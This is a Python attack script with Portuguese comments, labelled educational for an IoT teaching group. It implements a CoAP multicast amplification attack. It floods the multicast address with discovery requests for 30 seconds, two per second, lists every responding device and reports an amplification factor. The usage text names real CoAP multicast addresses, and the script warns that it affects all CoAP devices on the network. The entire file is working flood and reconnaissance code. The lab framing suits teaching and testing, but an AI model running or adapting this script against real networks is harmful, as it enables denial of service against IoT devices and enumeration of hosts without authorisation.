#!/usr/bin/env python3
"""
CoAP Multicast Amplification Attack
Um request → múltiplas responses (DRDoS)
Para fins educacionais - GT-IoTEdu
"""

import asyncio
import sys
import time
from aiocoap import *

attack_stats = {
    'multicast_requests': 0,
    'responses_received': 0,
    'unique_responders': set(),
    'amplification_factor': 0.0
}

class MulticastAmplifier:
    def __init__(self, multicast_addr, port):
        self.multicast_addr = multicast_addr
        self.port = port
        self.uri = f"coap://{multicast_addr}:{port}"
    
    async def multicast_discovery(self, request_id):
        """Envia request multicast para descoberta"""
        try:
            protocol = await Context.create_client_context()
            
            # Request multicast para .well-known/core
            uri = f"{self.uri}/.well-known/core"
            request = Message(code=GET, uri=uri, mtype=NON)  # NON-Confirmable para multicast
            
            print(f"\n[!] Multicast Request {request_id:04d} enviado para {self.multicast_addr}")
            print(f"[*] Aguardando respostas de todos os dispositivos CoAP na rede...\n")
            
            attack_stats['multicast_requests'] += 1
            
            # Multicast não usa request().response tradicional
            # Precisamos ouvir múltiplas respostas
            
            pr = protocol.request(request)
            
            try:
                # Primeira resposta
                response = await asyncio.wait_for(pr.response, timeout=5.0)
                self.process_response(response)
            except asyncio.TimeoutError:
                print("[!] Timeout aguardando primeira resposta")
            
        except Exception as e:
            print(f"[✗] Erro: {e}")
    
    def process_response(self, response):
        """Processa cada resposta recebida"""
        attack_stats['responses_received'] += 1
        
        # Extrai IP do respondente
        responder_ip = "unknown"
        if hasattr(response, 'remote'):
            responder_ip = str(response.remote.hostinfo)
        
        attack_stats['unique_responders'].add(responder_ip)
        
        payload_preview = response.payload[:100] if len(response.payload) > 100 else response.payload
        
        print(f"[📡] Resposta #{attack_stats['responses_received']} de {responder_ip}")
        print(f"    └─> Code: {response.code}")
        print(f"    └─> Payload: {payload_preview}")
        print()
    
    async def continuous_multicast_flood(self, duration_seconds):
        """Envia multicast requests continuamente"""
        
        print(f"\n[*] Iniciando flood multicast por {duration_seconds} segundos...\n")
        
        start_time = time.time()
        request_id = 0
        
        while time.time() - start_time < duration_seconds:
            await self.multicast_discovery(request_id)
            request_id += 1
            await asyncio.sleep(0.5)  # 2 requests/segundo
        
        # Calcula amplificação
        if attack_stats['multicast_requests'] > 0:
            attack_stats['amplification_factor'] = attack_stats['responses_received'] / attack_stats['multicast_requests']
        
        print("\n" + "=" * 70)
        print("[✓] CoAP Multicast Amplification Attack Completado!")
        print("=" * 70)
        print(f"[✓] Requests multicast enviados: {attack_stats['multicast_requests']}")
        print(f"[✓] Responses recebidas: {attack_stats['responses_received']}")
        print(f"[✓] Dispositivos únicos encontrados: {len(attack_stats['unique_responders'])}")
        print(f"[✓] Fator de amplificação: {attack_stats['amplification_factor']:.2f}x")
        print("\n[*] Dispositivos descobertos:")
        for ip in sorted(attack_stats['unique_responders']):
            print(f"  - {ip}")
        print("=" * 70)

async def main():
    if len(sys.argv) < 3:
        print("Uso: python3 attack.py <multicast_addr> <port>")
        print("\nEndereços multicast CoAP:")
        print("  IPv4: 224.0.1.187")
        print("  IPv6: ff02::fd (link-local)")
        print("  IPv6: ff05::fd (site-local)")
        print("\nExemplo: python3 attack.py 224.0.1.187 5683")
        sys.exit(1)
    
    multicast_addr = sys.argv[1]
    port = int(sys.argv[2])
    
    print("=" * 70)
    print("  CoAP MULTICAST AMPLIFICATION - Educational Purpose Only")
    print("  GT-IoTEdu - Grupo de Trabalho IoT Educacional")
    print("=" * 70)
    print(f"[*] Multicast Address: {multicast_addr}:{port}")
    print(f"[*] Técnica: Multicast Discovery Amplification")
    print(f"[*] Objetivo: 1 request → N responses (N = dispositivos)")
    print(f"[*] Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}")
    print("=" * 70)
    print("\n[!] AVISO: Requer --network=host no Docker")
    print("[!] AVISO: Afeta TODOS os dispositivos CoAP na rede\n")
    
    amplifier = MulticastAmplifier(multicast_addr, port)
    await amplifier.continuous_multicast_flood(duration_seconds=30)

if __name__ == "__main__":
    asyncio.run(main())